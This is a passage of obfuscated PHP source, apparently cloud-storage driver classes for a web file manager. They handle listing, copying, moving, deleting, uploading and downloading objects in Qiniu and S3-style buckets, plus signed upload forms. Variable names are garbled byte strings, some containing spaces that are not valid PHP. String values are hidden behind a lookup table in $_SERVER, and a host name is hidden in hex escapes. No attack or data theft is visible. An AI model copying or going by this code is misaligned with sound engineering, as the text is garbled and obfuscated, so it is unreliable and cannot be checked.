trim($±Ÿ»İç£, $Åçªâ‹[8]); if ($this->_isFolder($¬â ˆğÛ)) { return $this->getPathOuter($¬â ˆğÛ); } $±Ÿ»İç£ = $¬â ˆğÛ . $Åçªâ‹[8]; $—‰ıÖîÑ = get_path_this($¬â ˆğÛ); $‰˜ö€„– = $±Ÿ»İç£ . $—‰ıÖîÑ; if (!$this->mkfile($‰˜ö€„–)) { return !1; } if (!$this->moveFile($‰˜ö€„–, $±Ÿ»İç£)) { $this->delFile($‰˜ö€„–); return !1; } return $this->getPathOuter($¬â ˆğÛ); } public function copyFile($Ù­†£ë, $£«íû) { $ ’À“‹ = $this->bucketManager->copy($this->bucket, $Ù­†£ë, $this->bucket, $£«íû, !0); return $ ’À“‹ ? !1 : $this->getPathOuter($£«íû); } public function moveFile($ìÛçÊô, $€İÔÏß¨) { $ºûĞª•ó = $this->bucketManager->move($this->bucket, $ìÛçÊô, $this->bucket, $€İÔÏß¨, !0); return $ºûĞª•ó ? !1 : $this->getPathOuter($€İÔÏß¨); } public function delFile($…»ş÷ˆÉ) { if (!$this->exist($…»ş÷ˆÉ)) { return !0; } $§ş¾àÂ× = $this->bucketManager->delete($this->bucket, $…»ş÷ˆÉ); return $§ş¾àÂ× ? !1 : !0; } public function delFolder($Õ•–»Û) { $è¤ ’¡ =& $_SERVER[ •ŒÓîÆ]; if (!$this->exist($Õ•–»Û)) { return !0; } $this->listItemCache = !1; $ ï †‘ = $this->fileList($Õ•–»Û); $this->listItemCache = !0; $¥©Œ’ö = trim($Õ•–»Û, $è¤ ’¡[8]) . $è¤ ’¡[8]; if (!empty($Õ•–»Û) && $Õ•–»Û !== $è¤ ’¡[214] && !in_array($¥©Œ’ö, $ ï †‘[$è¤ ’¡[84]])) { $ ï †‘[$è¤ ’¡[84]][] = $¥©Œ’ö; } $ßŞåôúÔ = $this->delByBatch($ ï †‘[$è¤ ’¡[85]]); if (!$ßŞåôúÔ) { return !1; } $ßŞåôúÔ = $this->delByBatch($ ï †‘[$è¤ ’¡[84]]); if (!$ßŞåôúÔ) { return !1; } return $this->delFile($¥©Œ’ö); } private function delByBatch($€¨÷…‚€) { foreach (array_chunk($€¨÷…‚€, 1000) as $œ¶¨£·Ç) { $¡†¡à‚ş = $this->bucketManager->buildBatchDelete($this->bucket, $œ¶¨£·Ç); list($ÕéÛ°ÀØ, $Êü‘õ‡) = $this->bucketManager->batch($¡†¡à‚ş); if ($Êü‘õ‡) { return !1; } } return !0; } public function rename($ª™‘ÒÍ—, $ÎŒÅ“·) { return $this->renameObject($ª™‘ÒÍ—, $ÎŒÅ“·); } public function fileInfo($æ€ÖëŠ´, $€¸ù‘Ê = false, $›¤üéİ = array()) { $ƒ¹èæäæ =& $_SERVER[ •ŒÓîÆ]; $€ßÅé­§ = array($ƒ¹èæäæ[32] => $this->pathThis($æ€ÖëŠ´), $ƒ¹èæäæ[86] => $this->getPathOuter($ƒ¹èæäæ[8] . $æ€ÖëŠ´), $ƒ¹èæäæ[33] => $ƒ¹èæäæ[216], $ƒ¹èæäæ[78] => isset($›¤üéİ[$ƒ¹èæäæ[1456]]) ? $›¤üéİ[$ƒ¹èæäæ[1456]] : 0, $ƒ¹èæäæ[177] => $this->ext($æ€ÖëŠ´)); if ($€¸ù‘Ê) { return $€ßÅé­§; } $€ßÅé­§[$ƒ¹èæäæ[217]] = $€ßÅé­§[$ƒ¹èæäæ[87]] = 0; $€ßÅé­§[$ƒ¹èæäæ[218]] = $€ßÅé­§[$ƒ¹èæäæ[219]] = !0; if (empty($›¤üéİ)) { $›¤üéİ = $this->objectMeta($æ€ÖëŠ´); if (!$›¤üéİ) { return $€ßÅé­§; } } if (isset($›¤üéİ[$ƒ¹èæäæ[220]]) && $›¤üéİ[$ƒ¹èæäæ[220]]) { $€ßÅé­§[$ƒ¹èæäæ[221]] = $›¤üéİ[$ƒ¹èæäæ[220]]; } if (isset($›¤üéİ[$ƒ¹èæäæ[230]]) && $›¤üéİ[$ƒ¹èæäæ[230]]) { $€ßÅé­§[$ƒ¹èæäæ[221]] = $›¤üéİ[$ƒ¹èæäæ[230]]; } if (isset($›¤üéİ[$ƒ¹èæäæ[1457]])) { $€ßÅé­§[$ƒ¹èæäæ[87]] = substr($›¤üéİ[$ƒ¹èæäæ[1457]] . $ƒ¹èæäæ[12], 0, 10); } if (isset($›¤üéİ[$ƒ¹èæäæ[1456]])) { $€ßÅé­§[$ƒ¹èæäæ[78]] = $›¤üéİ[$ƒ¹èæäæ[1456]]; } return $€ßÅé­§; } public function folderInfo($Ş¶¯´­, $ê¶æÄã = false) { $ªó­‹» =& $_SERVER[ •ŒÓîÆ]; $¸ëŠíúÌ = array($ªó­‹»[32] => $this->pathThis($Ş¶¯´­), $ªó­‹»[86] => $this->getPathOuter($ªó­‹»[8] . $Ş¶¯´­), $ªó­‹»[33] => $ªó­‹»[77]); if ($ê¶æÄã) { return $¸ëŠíúÌ; } $¸ëŠíúÌ[$ªó­‹»[217]] = $¸ëŠíúÌ[$ªó­‹»[87]] = 0; $¸ëŠíúÌ[$ªó­‹»[218]] = $¸ëŠíúÌ[$ªó­‹»[219]] = !0; $Ş¶¯´­ = rtrim($Ş¶¯´­, $ªó­‹»[8]) . $ªó­‹»[8]; $ï©›ßĞı = $this->objectMeta($Ş¶¯´­); if (isset($ï©›ßĞı[$ªó­‹»[1457]])) { $¸ëŠíúÌ[$ªó­‹»[87]] = substr($ï©›ßĞı[$ªó­‹»[1457]] . $ªó­‹»[12], 0, 10); } return $¸ëŠíúÌ; } public function listPath($º£‹… », $™ğ¡­Í— = false) { $õŒ½£‰ =& $_SERVER[ •ŒÓîÆ]; $óˆø…Ø = $this->fileList($º£‹… », $õŒ½£‰[8], !0); foreach ($óˆø…Ø[$õŒ½£‰[84]] as $…ØÏåğŞ => $¶Ä¦¢‹¦) { $óˆø…Ø[$õŒ½£‰[84]][$…ØÏåğŞ] = $this->folderInfo($¶Ä¦¢‹¦, $™ğ¡­Í—); } foreach ($óˆø…Ø[$õŒ½£‰[85]] as $…ØÏåğŞ => $¶Ä¦¢‹¦) { $óˆø…Ø[$õŒ½£‰[85]][$…ØÏåğŞ] = $this->fileInfo($¶Ä¦¢‹¦[$õŒ½£‰[96]], $™ğ¡­Í—, $¶Ä¦¢‹¦); } return $óˆø…Ø; } public function has($œÜ¯Š…Ü, $ç®ºìµ = false, $ÆãªŞ…Ş = true) { $£ÑÙÏ¯õ =& $_SERVER[ •ŒÓîÆ]; $œÜ¯Š…Ü = trim($œÜ¯Š…Ü, $£ÑÙÏ¯õ[8]); $²©¢™ÈŒ = empty($œÜ¯Š…Ü) && $œÜ¯Š…Ü !== $£ÑÙÏ¯õ[214] ? $£ÑÙÏ¯õ[12] : $œÜ¯Š…Ü . $£ÑÙÏ¯õ[8]; $ïÔ’ü¬¸ = $£ÑÙÏ¯õ[12]; $•ÏÅóªñ = 500; $Äñğ«öÁ = $£ÑÙÏ¯õ[8]; $É—ïÎ›ï = $¡åÌÙÖ¦ = 0; while (!0) { check_abort(); list($ûÈ§òÆŠ, $ì¡â¸â•) = $this->bucketManager->listFiles($this->bucket, $²©¢™ÈŒ, $ïÔ’ü¬¸, $•ÏÅóªñ, $Äñğ«öÁ); if ($ì¡â¸â•) { break; } $ïÔ’ü¬¸ = array_key_exists($£ÑÙÏ¯õ[1426], $ûÈ§òÆŠ) ? $ïÔ’ü¬¸ = $ûÈ§òÆŠ[$£ÑÙÏ¯õ[1458]] : $£ÑÙÏ¯õ[12]; if ($ç®ºìµ) { if (!empty($ûÈ§òÆŠ[$£ÑÙÏ¯õ[1459]])) { $É—ïÎ›ï += count($ûÈ§òÆŠ[$£ÑÙÏ¯õ[1459]]); } if (!empty($ûÈ§òÆŠ[$£ÑÙÏ¯õ[1460]])) { $¡åÌÙÖ¦ += count($ûÈ§òÆŠ[$£ÑÙÏ¯õ[1460]]); } if ($ïÔ’ü¬¸ === $£ÑÙÏ¯õ[12]) { break; } continue; } if ($ÆãªŞ…Ş) { if (!empty($ûÈ§òÆŠ[$£ÑÙÏ¯õ[1459]])) { return !0; } } else { if (!empty($ûÈ§òÆŠ[$£ÑÙÏ¯õ[1460]])) { return !0; } } if ($ïÔ’ü¬¸ === $£ÑÙÏ¯õ[12]) { break; } } if ($ç®ºìµ) { return array($£ÑÙÏ¯õ[225] => $É—ïÎ›ï, $£ÑÙÏ¯õ[226] => $¡åÌÙÖ¦); } return !1; } public function listAll($úÏğ†ŸÌ) { $¦Şî®º =& $_SERVER[ •ŒÓîÆ]; $™œøó‚ = $this->fileList($úÏğ†ŸÌ, $¦Şî®º[12], !0); $Ì½ıÑ¼ä = array_to_keyvalue($™œøó‚[$¦Şî®º[85]], $¦Şî®º[32]); foreach ($™œøó‚[$¦Şî®º[84]] as $ïÕ‹÷ı) { if (is_string($ïÕ‹÷ı)) { $Ì½ıÑ¼ä[$ïÕ‹÷ı] = array($¦Şî®º[78] => 0); } } return $this->listAllFiles($úÏğ†ŸÌ, $Ì½ıÑ¼ä); } private function fileList($Ò¡Ô‚, $œàÃ“í– = '', $÷´©Íı“ = 0) { $¡Ë«§˜¿ =& $_SERVER[ •ŒÓîÆ]; $Ò¡Ô‚ = trim($Ò¡Ô‚, $¡Ë«§˜¿[8]); $Œ”‚åññ = empty($Ò¡Ô‚) && $Ò¡Ô‚ !== $¡Ë«§˜¿[214] ? $¡Ë«§˜¿[12] : $Ò¡Ô‚ . $¡Ë«§˜¿[8]; $¼™î¶Š = $¡Ë«§˜¿[12]; $”—è¨Ëé = 1000; $ÒÕİ™Ú÷ = $Ş»Ê“˜¸ = array(); while (!0) { check_abort(); list($­ˆäŸ»¿, $ÍÈˆÂ À) = $this->bucketManager->listFiles($this->bucket, $Œ”‚åññ, $¼™î¶Š, $”—è¨Ëé, $œàÃ“í–); if ($ÍÈˆÂ À) { break; } $¼™î¶Š = array_key_exists($¡Ë«§˜¿[1426], $­ˆäŸ»¿) ? $¼™î¶Š = $­ˆäŸ»¿[$¡Ë«§˜¿[1458]] : $¡Ë«§˜¿[12]; $É¹ÔÆñ¿ = isset($­ˆäŸ»¿[$¡Ë«§˜¿[1459]]) ? $­ˆäŸ»¿[$¡Ë«§˜¿[1459]] : array(); $à›–ùú  = isset($­ˆäŸ»¿[$¡Ë«§˜¿[1460]]) ? $­ˆäŸ»¿[$¡Ë«§˜¿[1460]] : array(); foreach ($É¹ÔÆñ¿ as $åÖÉá”ú) { if ($åÖÉá”ú[$¡Ë«§˜¿[96]] == $Œ”‚åññ) { continue; } $ÏÕ™ô´ = $åÖÉá”ú[$¡Ë«§˜¿[96]]; $í¢ä¨Ş§ = $åÖÉá”ú[$¡Ë«§˜¿[1456]]; $åÖÉá”ú[$¡Ë«§˜¿[78]] = $í¢ä¨Ş§; $¥­åõÃ¨ = $í¢ä¨Ş§ == 0 && substr($ÏÕ™ô´, strlen($ÏÕ™ô´) - 1, 1) == $¡Ë«§˜¿[8] ? !0 : !1; $this->cacheMethodInfoSet($ÏÕ™ô´, $¥­åõÃ¨, $åÖÉá”ú); if ($¥­åõÃ¨) { $ÒÕİ™Ú÷[] = $ÏÕ™ô´; continue; } $Ş»Ê“˜¸[] = $÷´©Íı“ ? $åÖÉá”ú : $ÏÕ™ô´; } foreach ($à›–ùú  as $ÏÕ™ô´) { if ($ÏÕ™ô´ == $Œ”‚åññ) { continue; } $ÒÕİ™Ú÷[] = $ÏÕ™ô´; $this->cacheMethodInfoSet($ÏÕ™ô´, !0); } if ($¼™î¶Š === $¡Ë«§˜¿[12]) { break; } } $this->cacheMethodInfoSet($Ò¡Ô‚, !0); return array($¡Ë«§˜¿[84] => $ÒÕİ™Ú÷, $¡Ë«§˜¿[85] => $Ş»Ê“˜¸); } public function canRead($âŞÄ­¦) { return $this->exist($âŞÄ­¦) ? !0 : !1; } public function canWrite($ ™–Á¨) { return $this->exist($ ™–Á¨) ? !0 : !1; } public function getContent($‘ğò¤¦À) { return $this->fileSubstr($‘ğò¤¦À, 0, -1); } public function setContent($Úõû°½Å, $’Ó¼Æ„¼ = '') { $„ª†«ıÃ = $this->tempFile($this->pathThis($Úõû°½Å)); file_put_contents($„ª†«ıÃ, $’Ó¼Æ„¼); if ($this->upload($Úõû°½Å, $„ª†«ıÃ)) { $this->tempFileRemve($„ª†«ıÃ); return !0; } return !1; } public function refreshUrls($åÖ«í¾‚) { $³è¢Ş =& $_SERVER[ •ŒÓîÆ]; $áÜÏ¸Ç = array(); if (is_array($åÖ«í¾‚)) { foreach ($åÖ«í¾‚ as $÷ˆ¼İá·) { $áÜÏ¸Ç[] = $this->link($÷ˆ¼İá·); } } else { $áÜÏ¸Ç[] = $this->link($åÖ«í¾‚); } $Š–ÛòùŞ = new Qiniu\Cdn\CdnManager($this->auth); list($­ûğÈŒÅ, $ÏŠìôÛ€) = $Š–ÛòùŞ->refreshUrls($áÜÏ¸Ç); if ($ÏŠìôÛ€) { return !1; } return $­ûğÈŒÅ[$³è¢Ş[1223]] == $³è¢Ş[800] ? !0 : !1; } public function fileSubstr($äãĞøı, $ŠâÑÔÄô, $±é®øş¬) { $íøÅêŞ× =& $_SERVER[ •ŒÓîÆ]; if (!($Ã°½§¸ = $this->link($äãĞøı))) { return !1; } $§°šŞ¹´ = !1; if ($±é®øş¬ > 0) { $Ñ·éü™ı = $ŠâÑÔÄô + $±é®øş¬ - 1; $§°šŞ¹´ = array($íøÅêŞ×[1461] . $ŠâÑÔÄô . $íøÅêŞ×[440] . $Ñ·éü™ı); } $òµ×Î–— = url_request($Ã°½§¸, $íøÅêŞ×[247], !1, $§°šŞ¹´); return $òµ×Î–—[$íøÅêŞ×[791]] ? $òµ×Î–—[$íøÅêŞ×[1243]] : !1; } public function upload($Öóêïè, $áÃøœÈ‰, $«ƒøôéÌ = false, $›­ÊÃõå = REPEAT_REPLACE) { $Ûå²Å‘ä = new Qiniu\Storage\UploadManager(); $”‹³Âï¸ = $this->auth->uploadToken($this->bucket, $Öóêïè); $»ŸÔ»ª¼ = get_file_mime(get_path_ext($áÃøœÈ‰)); list($ÊÀÁÛ½, $¹¼ÔÒ‚²) = $Ûå²Å‘ä->putFile($”‹³Âï¸, $Öóêïè, $áÃøœÈ‰, null, $»ŸÔ»ª¼); return $¹¼ÔÒ‚² ? !1 : $this->getPathOuter($Öóêïè); } public function uploadFormData($ˆÈïÖñù, $Áóââà… = 3600) { return $this->uploadToken($ˆÈïÖñù, $Áóââà…); } public function multiUploadFormData($š÷«ı¼Ò, $œñ‘ëóå = 3600) { return $this->uploadToken($š÷«ı¼Ò, $œñ‘ëóå); } private function uploadToken($ºÍ¼©Ş€, $À±æŠì = 3600) { $¬÷±œ¨– =& $_SERVER[ •ŒÓîÆ]; $Ô²ï›å = $À±æŠì; $ƒ—€ã÷æ = array($¬÷±œ¨–[1462] => $¬÷±œ¨–[1463]); $·‚Æºó = $ºÍ¼©Ş€; $Î™°°ñÊ = $this->auth->uploadToken($this->bucket, $·‚Æºó, $Ô²ï›å, $ƒ—€ã÷æ, !0); $Îƒ¥İ‹¬ = empty($this->region) || $this->region == $¬÷±œ¨–[1464] ? $¬÷±œ¨–[12] : $¬÷±œ¨–[440] . $this->region; $í¦ûÖ¦ = http_type() . "\x3a\x2f\x2f\x75\160\x6c\x6f\141\x64{$Îƒ¥İ‹¬}\x2e\x71\151\156\151\x75\160\x2e\143\x6f\x6d\57"; return array($¬÷±œ¨–[1465] => $Î™°°ñÊ, $¬÷±œ¨–[1466] => $í¦ûÖ¦); } public function download($õÃ«×Şè, $‚•×šáÎ) { $Ÿ¡şÓã = IO::getPathInner(IO::mkfile($‚•×šáÎ)); if (!($îìéüÇ€ = $this->link($õÃ«×Şè))) { return !1; } $£¤•´À— = 0; $Êáøµ»Û = 1024 * 200; $Ú›°’×Ú = fopen($Ÿ¡şÓã, $_SERVER[ •ŒÓîÆ][1467]); while (!0) { $˜ø‚åî = $this->fileSubstr($õÃ«×Şè, $£¤•´À—, $Êáøµ»Û); if ($˜ø‚åî === !1) { return !1; } fwrite($Ú›°’×Ú, $˜ø‚åî); $£¤•´À— += $Êáøµ»Û; if (strlen($˜ø‚åî) < $Êáøµ»Û) { break; } } fclose($Ú›°’×Ú); return $‚•×šáÎ; } public function link($Ÿ¢“Œáç, $£ê½µì„ = '') { if (!$this->isFile($Ÿ¢“Œáç)) { return !1; } $¤ß½¹§– = $this->getHost() . $_SERVER[ •ŒÓîÆ][8] . $this->pathEncode($Ÿ¢“Œáç) . $£ê½µì„; return $this->auth->privateDownloadUrl($¤ß½¹§–, 3600 * 12); } public function fileOut($ÌÈƒ¼Ôù, $âĞ¬§Ÿ = false, $……‘áªÍ = false, $²ˆ—¯º† = '') { $ÃÇÇîÚ¸ =& $_SERVER[ •ŒÓîÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÌÈƒ¼Ôù, $âĞ¬§Ÿ, $……‘áªÍ, $²ˆ—¯º†); } if (!$……‘áªÍ) { $……‘áªÍ = $this->pathThis($ÌÈƒ¼Ôù); } $á¶Şâé± = $âĞ¬§Ÿ ? $ÃÇÇîÚ¸[1468] . rawurlencode($……‘áªÍ) : $ÃÇÇîÚ¸[12]; $œîúÂ§ = $this->link($ÌÈƒ¼Ôù, $á¶Şâé±); $this->fileOutLink($œîúÂ§); } public function fileOutServer($«ÃËÀñá, $õ÷›‘¯¢ = false, $•¶é¾äÈ = false, $™ÁàÛ‡ö = '') { parent::fileOut($«ÃËÀñá, $õ÷›‘¯¢, $•¶é¾äÈ, $™ÁàÛ‡ö); } public function fileOutImage($øõÛÏ, $­Å§Ç Ï = 250) { $é•…¨³ï = $this->link($øõÛÏ, $_SERVER[ •ŒÓîÆ][1469] . $­Å§Ç Ï); $this->fileOutLink($é•…¨³ï); } public function fileOutImageServer($¿‰ÆéÑİ, $ú­ìšÎ = 250) { parent::fileOutImage($¿‰ÆéÑİ, $ú­ìšÎ); } public function hashMd5($øñæ³§) { $ª°¶ÂûÜ =& $_SERVER[ •ŒÓîÆ]; $å“îÛ„µ = $this->objectMeta($øñæ³§); return isset($å“îÛ„µ[$ª°¶ÂûÜ[230]]) ? $å“îÛ„µ[$ª°¶ÂûÜ[230]] : !1; $™«òÆøœ = $this->link($øñæ³§, $ª°¶ÂûÜ[1470]); } public function size($î€ôğÄ) { $‡‘ÄˆÑ = $this->objectMeta($î€ôğÄ); return $‡‘ÄˆÑ ? $‡‘ÄˆÑ[$_SERVER[ •ŒÓîÆ][78]] : 0; } public function info($Ïø¤§ğä) { if ($this->isFolder($Ïø¤§ğä)) { return $this->folderInfo($Ïø¤§ğä); } else { if ($this->isFile($Ïø¤§ğä)) { return $this->fileInfo($Ïø¤§ğä); } } return !1; } public function exist($Éª¡¸ ‡) { return $this->isFile($Éª¡¸ ‡) || $this->isFolder($Éª¡¸ ‡); } public function isFile($¼¢¾«³¡) { return !$this->isFolder($¼¢¾«³¡) && $this->objectMeta($¼¢¾«³¡); } public function isFolder($Âô³ÔàÖ) { return $this->cacheMethod($_SERVER[ •ŒÓîÆ][168], $Âô³ÔàÖ); } protected function objectMeta($Õæƒ‘¥ä) { return $this->cacheMethod($_SERVER[ •ŒÓîÆ][170], $Õæƒ‘¥ä); } protected function _objectMeta($’µÃ©”Ë) { $ÊøåêŒÅ =& $_SERVER[ •ŒÓîÆ]; list($’‰üõ¬Ï, $Ÿ£ıíõ§) = $this->bucketManager->stat($this->bucket, $’µÃ©”Ë); if ($’‰üõ¬Ï) { $’‰üõ¬Ï[$ÊøåêŒÅ[78]] = intval($’‰üõ¬Ï[$ÊøåêŒÅ[1456]]); } return $’‰üõ¬Ï; } protected function _isFolder($—È™¯À¡) { $¨£ä½Œ =& $_SERVER[ •ŒÓîÆ]; if ($—È™¯À¡ == $¨£ä½Œ[12] || $—È™¯À¡ == $¨£ä½Œ[8]) { return !0; } list($Å¡Ğ›ò¤, $úü‰×¥è) = $this->bucketManager->listFiles($this->bucket, trim($—È™¯À¡, $¨£ä½Œ[8]) . $¨£ä½Œ[8], $¨£ä½Œ[12], 1, $¨£ä½Œ[8]); return !empty($Å¡Ğ›ò¤[$¨£ä½Œ[1459]]) || !empty($Å¡Ğ›ò¤[$¨£ä½Œ[1460]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($İ¡ğ’¥) { parent::__construct($İ¡ğ’¥); } public function uploadFormData($ÓéäÉ”¹, $şŸÚŞ… = 3600) { $¡…¿ë¥ =& $_SERVER[ •ŒÓîÆ]; $¥É £ïœ = $¡…¿ë¥[215]; $á’«èİ• = $¡…¿ë¥[264]; $¹œ½È¿ü = $¡…¿ë¥[62]; $¹è·Ë€Ä = gmdate($¡…¿ë¥[265]); $´êÒÒÚ× = gmdate($¡…¿ë¥[266]); $Úê£§ï¯ = $¡…¿ë¥[267]; $ÉöŸƒü = $şŸÚŞ… . $¡…¿ë¥[12]; $íÊ‹¢ÇË = $¡…¿ë¥[268]; $ÑÕ±­Í® = array($this->accessKey, $´êÒÒÚ×, $this->region, $¹œ½È¿ü, $Úê£§ï¯); $– ŒÓ¯™ = implode($¡…¿ë¥[8], $ÑÕ±­Í®); $“Æ¤ò£ó = array($¡…¿ë¥[269] => gmdate($¡…¿ë¥[1366], strtotime($¡…¿ë¥[271])), $¡…¿ë¥[272] => array(array($¡…¿ë¥[273] => $this->bucket), array($¡…¿ë¥[274] => $¥É £ïœ), array($¡…¿ë¥[275], $¡…¿ë¥[276], $¡…¿ë¥[12]), array($¡…¿ë¥[275], $¡…¿ë¥[277], $¡…¿ë¥[12]), array($¡…¿ë¥[275], $¡…¿ë¥[278], $¡…¿ë¥[12]), array($¡…¿ë¥[279] => $íÊ‹¢ÇË), array($¡…¿ë¥[280] => $– ŒÓ¯™), array($¡…¿ë¥[281] => $á’«èİ•), array($¡…¿ë¥[282] => $¹è·Ë€Ä), array($¡…¿ë¥[283] => $ÉöŸƒü))); $æ×˜ˆ·‡ = base64_encode(json_encode($“Æ¤ò£ó)); $ôñš» = hash_hmac($¡…¿ë¥[284], $´êÒÒÚ×, $¡…¿ë¥[285] . $this->secret, !0); $ëÀ÷¡Àè = hash_hmac($¡…¿ë¥[284], $this->region, $ôñš», !0); $€»”î—· = hash_hmac($¡…¿ë¥[284], $¹œ½È¿ü, $ëÀ÷¡Àè, !0); $…ÖÏÊ”ä = hash_hmac($¡…¿ë¥[284], $Úê£§ï¯, $€»”î—·, !0); $Ë»ó‡Ê½ = hash_hmac($¡…¿ë¥[284], $æ×˜ˆ·‡, $…ÖÏÊ”ä); $®‹ÏÚ¥ä = array($¡…¿ë¥[232] => $¡…¿ë¥[12], $¡…¿ë¥[286] => $¡…¿ë¥[12], $¡…¿ë¥[274] => $¥É £ïœ, $¡…¿ë¥[279] => $íÊ‹¢ÇË, $¡…¿ë¥[287] => $æ×˜ˆ·‡, $¡…¿ë¥[288] => $– ŒÓ¯™, $¡…¿ë¥[289] => $á’«èİ•, $¡…¿ë¥[290] => $¹è·Ë€Ä, $¡…¿ë¥[291] => $ÉöŸƒü, $¡…¿ë¥[292] => $Ë»ó‡Ê½, $¡…¿ë¥[198] => $this->getHost()); return $®‹ÏÚ¥ä; } public function multiUploadFormData($êÎªÂ—”, $ÖÑ’·¡Ÿ = 3600) { $í±Ã•Ç» =& $_SERVER[ •ŒÓîÆ]; $¿²öıÖ÷ = gmdate($í±Ã•Ç»[1471]); $·áÉìıá = array(); $¦Á†»‘Å = $this->client->getUploadId($this->bucket, $êÎªÂ—”, $·áÉìıá); if (!$¦Á†»‘Å) { return !1; } return array($í±Ã•Ç»[240] => $¦Á†»‘Å, $í±Ã•Ç»[198] => $this->getHost() . $í±Ã•Ç»[8] . $this->pathEncode($êÎªÂ—”), $í±Ã•Ç»[241] => $¿²öıÖ÷, $í±Ã•Ç»[96] => $êÎªÂ—”); } public function multiUploadAuthData($•³Ğ¤Ø, $ıËñ¥´ = array()) { $¾±¯ıÒ =& $_SERVER[ •ŒÓîÆ]; $şÈ“üÙö = isset($ıËñ¥´[$¾±¯ıÒ[177]]) ? $ıËñ¥´[$¾±¯ıÒ[177]] : $¾±¯ıÒ[12]; $Çğä±Š· = $ıËñ¥´[$¾±¯ıÒ[96]]; unset($ıËñ¥´[$¾±¯ıÒ[96]]); if (isset($ıËñ¥´[$¾±¯ıÒ[242]])) { return $this->listUploadParts($Çğä±Š·, $ıËñ¥´); } $°©úœİà = array(); if (isset($ıËñ¥´[$¾±¯ıÒ[1472]])) { $°©úœİà[$¾±¯ıÒ[1473]] = $ıËñ¥´[$¾±¯ıÒ[1472]]; } $˜µ¶ÆŠò = explode($¾±¯ıÒ[200], $this->getHost()); $²’Ş Ä” = array($¾±¯ıÒ[1474] => $˜µ¶ÆŠò[1], $¾±¯ıÒ[1475] => $¾±¯ıÒ[12], $¾±¯ıÒ[232] => $¾±¯ıÒ[122], $¾±¯ıÒ[286] => $ıËñ¥´[$¾±¯ıÒ[78]]); $˜¾·ÈÖ¹ = $¾±¯ıÒ[245]; $êÏÏ£ëÓ = $¾±¯ıÒ[8] . $this->pathEncode($Çğä±Š·) . $şÈ“üÙö; $úÛ›ùş“ = $this->client->__getSignatureV4($°©úœİà, $²’Ş Ä”, $˜¾·ÈÖ¹, $êÏÏ£ëÓ); if (strpos($şÈ“üÙö, $¾±¯ıÒ[244]) === 0) { if (isset($°©úœİà[$¾±¯ıÒ[1473]])) { $öÅş©Áß = $°©úœİà[$¾±¯ıÒ[1473]]; } else { if (isset($úÛ›ùş“[$¾±¯ıÒ[1473]])) { $öÅş©Áß = $úÛ›ùş“[$¾±¯ıÒ[1473]]; } else { $öÅş©Áß = hash($¾±¯ıÒ[284], $¾±¯ıÒ[12]); } } return array($¾±¯ıÒ[251] => $úÛ›ùş“[$¾±¯ıÒ[251]], $¾±¯ıÒ[1473] => $öÅş©Áß, $¾±¯ıÒ[241] => $úÛ›ùş“[$¾±¯ıÒ[1476]]); } return $úÛ›ùş“[$¾±¯ıÒ[251]]; } public function listUploadParts($Á£ Ì©ğ, $ËÄ–Û¿ = array()) { $ò½–ÆÑç =& $_SERVER[ •ŒÓîÆ]; $ğ¿ÁÅÇà = str_replace($ò½–ÆÑç[252], $ò½–ÆÑç[12], $ËÄ–Û¿[$ò½–ÆÑç[177]]); $ˆÜ—Á÷õ = $this->client->listParts($this->bucket, $Á£ Ì©ğ, $ğ¿ÁÅÇà); if (!$ˆÜ—Á÷õ) { return !1; } $áÎ™Èà² = $ò½–ÆÑç[1477]; foreach ($ˆÜ—Á÷õ as $¨§¾İ¾Ú) { $áÎ™Èà² .= $ò½–ÆÑç[1478] . "\74\120\x61\x72\x74\116\165\155\x62\145\162\76{$¨§¾İ¾Ú[$ò½–ÆÑç[1434]]}\x3c\x2f\x50\141\x72\x74\x4e\165\x6d\x62\x65\x72\x3e\xa" . "\x3c\105\x54\141\147\76{$¨§¾İ¾Ú[$ò½–ÆÑç[1435]]}\74\57\x45\x54\x61\x67\x3e\xa" . $ò½–ÆÑç[1479]; } $áÎ™Èà² .= $ò½–ÆÑç[1480]; $áÒÕ‰ÛÄ = array(); $‰´¼Ş† = explode($ò½–ÆÑç[200], $this->getHost()); $èò°©–” = array($ò½–ÆÑç[1474] => $‰´¼Ş†[1], $ò½–ÆÑç[232] => $ò½–ÆÑç[122], $ò½–ÆÑç[286] => strlen($áÎ™Èà²)); $ûèâÑµë = $ò½–ÆÑç[243]; $ã¢¸ŠäÆ = $ò½–ÆÑç[8] . $this->pathEncode($Á£ Ì©ğ) . $ËÄ–Û¿[$ò½–ÆÑç[177]]; $€¬İåÃ  = $this->client->__getSignatureV4($áÒÕ‰ÛÄ, $èò°©–”, $ûèâÑµë, $ã¢¸ŠäÆ, $áÎ™Èà²); return array($ò½–ÆÑç[251] => $€¬İåÃ [$ò½–ÆÑç[251]], $ò½–ÆÑç[241] => $€¬İåÃ [$ò½–ÆÑç[1476]], $ò½–ÆÑç[253] => $ˆÜ—Á÷õ, $ò½–ÆÑç[1473] => $€¬İåÃ [$ò½–ÆÑç[1473]]); } public function link($ªŞÚšğ©, $¼‚ËÈŠ¬ = array()) { return parent::link($ªŞÚšğ©, $¼‚ËÈŠ¬); } public function fileOut($Ó·ÃĞı—, $¶œ½¯Å‡ = false, $ÀÚüğ´Ñ = false, $ñÇîëÚ¤ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ •ŒÓîÆ][1481])) { return parent::fileOutServer($Ó·ÃĞı—, $¶œ½¯Å‡, $ÀÚüğ´Ñ, $ñÇîëÚ¤); } parent::fileOut($Ó·ÃĞı—, $¶œ½¯Å‡, $ÀÚüğ´Ñ, $ñÇîëÚ¤); } public function fileOutImage($®È‰¨Ã™, $Ï©ÃÔœ® = 250) { if (strstr($this->endpoint, $_SERVER[ •ŒÓîÆ][1481])) { return parent::fileOutImageServer($®È‰¨Ã™, $Ï©ÃÔœ®); } parent::fileOutImage($®È‰¨Ã™, $Ï©ÃÔœ®); } public function fileOutLink($àŞ‘óßî) { $Ê—©ç¢ò =& $_SERVER[ •ŒÓîÆ]; if (substr($àŞ‘óßî, 0, 7) == $Ê—©ç¢ò[1372]) { $àŞ‘óßî = $Ê—©ç¢ò[1373] . substr($àŞ‘óßî, 7); } header($Ê—©ç¢ò[164] . $àŞ‘óßî); die; } public function getHost() { $±¿Ú‰Áş =& $_SERVER[ •ŒÓîÆ]; $¨ØÃµÆ  = str_rtrim(parent::getHost(), $±¿Ú‰Áş[8] . $this->bucket); $¨ØÃµÆ  = explode($±¿Ú‰Áş[200], $¨ØÃµÆ ); return $¨ØÃµÆ [0] . $±¿Ú‰Áş[200] . $this->bucket . $±¿Ú‰Áş[10] . $¨ØÃµÆ [1]; } } class PathDriverStream extends 